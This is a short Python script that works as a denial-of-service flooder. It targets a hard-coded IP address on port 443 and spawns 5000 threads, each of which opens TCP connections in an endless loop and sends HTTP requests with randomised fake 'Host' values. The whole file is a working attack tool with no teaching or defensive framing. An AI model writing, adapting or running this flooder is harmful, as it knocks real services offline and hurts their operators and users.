import random
import socket
import threading

target = '107.150.4.187'
attack_num=0
port = 443

def get_fake_ip():
    return f'107.{random.randrange(0,255)}.{random.randrange(0,255)}.{random.randrange(0,255)}'

def attack():

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: " + get_fake_ip() + "\r\n\r\n").encode('ascii'), (target, port))

        global attack_num
        attack_num += 1
        if (attack_num %1000==0): print(attack_num)
        s.close()

for i in range(5000):
    thread = threading.Thread(target=attack)
    thread.start()